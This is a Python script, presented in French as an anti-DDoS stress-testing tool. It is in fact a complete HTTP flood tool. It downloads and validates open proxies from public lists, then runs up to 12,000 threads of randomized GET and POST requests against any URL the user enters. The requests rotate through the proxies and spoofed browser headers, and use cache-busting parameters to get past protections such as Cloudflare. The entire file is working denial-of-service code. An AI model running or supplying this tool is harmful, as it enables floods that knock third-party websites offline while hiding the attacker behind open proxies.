import requests
import time
import random
import sys
import os
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

ASCII_ART = """
\033[91m
   ██╗ ██╗██╗██████╗ ██████╗ ███████╗███████╗████████╗██████╗ ███████╗███████╗███████╗
   ██║ ██╔╝██║██╔══██╗██╔═══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
   █████╔╝ ██║██████╔╝██║ ██║███████╗███████╗ ██║ ██████╔╝█████╗ ███████╗███████╗
   ██╔═██╗ ██║██╔══██╗██║ ██║╚════██║╚════██║ ██║ ██╔══██╗██╔══╝ ╚════██║╚════██║
   ██║ ██╗██║██║ ██║╚██████╔╝███████║███████║ ██║ ██║ ██║███████╗███████║███████║
   ╚═╝ ╚═╝╚═╝╚═╝ ╚═╝ ╚═════╝ ╚══════╝╚══════╝ ╚═╝ ╚═╝ ╚═╝╚══════╝╚══════╝╚══════╝
\033[0m
          \033[1;36m[ v9.1 – 2026 Edition | Test de charge / Anti-DDoS Stress ]\033[0m
"""

INTENSITY = {
    1: {"threads": 400,   "name": "Léger"},
    2: {"threads": 1200,  "name": "Moyen"},
    3: {"threads": 3000,  "name": "Fort"},
    4: {"threads": 6000,  "name": "Extrême"},
    5: {"threads": 12000, "name": "APOCALYPSE"}
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
]

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v4/getproxies?protocol=http&timeout=8000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Https.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
]

def clear():
    print("\033[H\033[J", end="")

def print_log(msg, color="\033[92m"):
    ts = datetime.now().strftime('%H:%M:%S')
    print(f"[{ts}] {color}{msg}\033[0m")

def test_proxy(proxy_str):
    try:
        proxies = {'http': proxy_str, 'https': proxy_str}
        r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=6)
        if r.status_code == 200:
            ip = r.json().get("origin", "???")
            return True, ip
    except:
        pass
    return False, None

def fetch_fresh_proxies():
    print_log("Téléchargement proxies frais (2026 sources)...", "\033[96m")
    fresh = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=12)
            if r.status_code == 200:
                lines = {l.strip() for l in r.text.splitlines() if ':' in l and l.strip()}
                fresh.update(lines)
                print_log(f"+ {len(lines):4d} depuis {url.split('/')[2]}", "\033[93m")
        except:
            pass
    return list(fresh)

def validate_and_save_proxies():
    print_log("Validation + nettoyage proxies...", "\033[96m")
    
    old = set()
    if os.path.exists("proxies.txt"):
        with open("proxies.txt") as f:
            old = {line.strip() for line in f if ':' in line.strip()}

    new = fetch_fresh_proxies()
    all_p = list(old | set(new))
    print_log(f"{len(all_p):,} proxies à tester...", "\033[1;36m")

    working = []
    with ThreadPoolExecutor(max_workers=200) as ex:
        futures = {ex.submit(test_proxy, f"http://{p}"): p for p in all_p}
        for future in as_completed(futures):
            p = futures[future]
            ok, ip = future.result()
            if ok:
                working.append(p)
                print_log(f"OK → {ip}", "\033[92m")
            else:
                print_log(f"DEAD → {p}", "\033[91m")

    working = list(set(working)) 
    with open("proxies.txt", "w") as f:
        f.write("\n".join(working) + "\n")

    print_log(f"{len(working):,} proxies VIVANTS enregistrés !", "\033[1;92m")
    return [f"http://{p}" for p in working]

def generate_headers():
    ua = random.choice(USER_AGENTS)
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }

def attack_worker(target_url, proxy, duration_sec, stats, counter: Counter):
    start = time.time()
    session = requests.Session()

    while time.time() - start < duration_sec:
        try:
            headers = generate_headers()
            
            if random.random() < 0.35:
                data = {"q": random.randint(1, 999999), "t": time.time()}
                r = session.post(
                    target_url + "?" + urllib.parse.urlencode({"cb": random.randint(1, 9999999)}),
                    headers=headers,
                    data=data,
                    proxies={"http": proxy, "https": proxy},
                    timeout=4
                )
            else:
                r = session.get(
                    target_url + "?" + urllib.parse.urlencode({"r": random.random()}),
                    headers=headers,
                    proxies={"http": proxy, "https": proxy},
                    timeout=4
                )

            status = r.status_code
            stats["total"] += 1
            stats["success"] += 1
            counter[status] += 1

            msg = f"{status} | {proxy.split('://')[-1].split('@')[-1]}"
            color = "\033[92m" if status < 400 else "\033[93m" if status < 500 else "\033[91m"

            if status in (403, 429, 503) and ("cloudflare" in r.text.lower() or "ray id" in r.text.lower()):
                color = "\033[95m"
                msg += " (CF/WAF)"

            print_log(msg, color)

        except Exception:
            stats["failed"] += 1
            counter["ERR"] += 1
            time.sleep(random.uniform(0.1, 0.6)) 



def main():
    clear()
    print(ASCII_ART)

    print("\033[93m[1] Cible (ton site de test)\033[0m")
    target = input(" ➤ URL : ").strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    print(f" CIBLE → {target}\n")

    print("\033[93m[2] Durée du test (secondes)\033[0m")
    try:
        duration = int(input(" ➤ Temps : ").strip())
    except:
        duration = 120
    print(f" DURÉE → {duration}s\n")

    print("\033[93m[3] Intensité\033[0m")
    for k, v in INTENSITY.items():
        print(f" {k} → {v['name']} ({v['threads']:,} threads)")
    level = input(" ➤ Niveau (1-5) : ").strip()
    level = int(level) if level in "12345" else 3
    threads = INTENSITY[level]["threads"]
    name = INTENSITY[level]["name"]
    print(f" → {name} ({threads:,} threads)\n")

    print_log("Phase proxy → nettoyage & validation...", "\033[1;36m")
    proxies = validate_and_save_proxies()

    if len(proxies) < 30:
        print_log("Pas assez de proxies vivants (<30) → arrêt.", "\033[91m")
        return

    print_log(f"{len(proxies):,} proxies prêts → LANCEMENT", "\033[1;92m")
    print("\n\033[1;31m" + "═"*85)
    print(f" STRESS TEST – NIVEAU {level} : {name.upper()}")
    print("═"*85 + "\033[0m\n")
    time.sleep(2.5)

    stats = {"total": 0, "success": 0, "failed": 0}
    counter = Counter()

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(threads):
            proxy = random.choice(proxies)
            futures.append(executor.submit(attack_worker, target, proxy, duration, stats, counter))

        for f in futures:
            try:
                f.result()
            except:
                pass

    total_time = time.time() - start_time
    rps = stats["success"] / total_time if total_time > 0 else 0

    clear()
    print(ASCII_ART)
    print("\033[1;33m" + "═"*85)
    print(" TEST TERMINÉ")
    print("═"*85)
    print(f" CIBLE       → {target}")
    print(f" DURÉE       → {duration}s")
    print(f" NIVEAU      → {level} - {name}")
    print(f" RPS moyen   → {rps:,.1f} req/s")
    print(f" Succès      → {stats['success']:,} / {stats['total']:,}")
    print(f" Échecs      → {stats['failed']:,}")
    print(f" Proxies     → {len(proxies):,} vivants")
    print("\n Codes HTTP les plus fréquents :")
    for code, cnt in counter.most_common(8):
        print(f"   {code:>4} → {cnt:>6,} fois")
    print("═"*85)

    if rps > 2000:
        print("\033[91mAttention : très fort impact détecté !\033[0m")
    elif rps > 800:
        print("\033[93mImpact notable – ton anti-DDoS doit commencer à fatiguer\033[0m")
    else:
        print("\033[92mTon anti-DDoS tient bien pour l'instant\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91mArrêt forcé.\033[0m")
    except Exception as e:
        print(f"\n\033[91mErreur inattendue : {e}\033[0m")
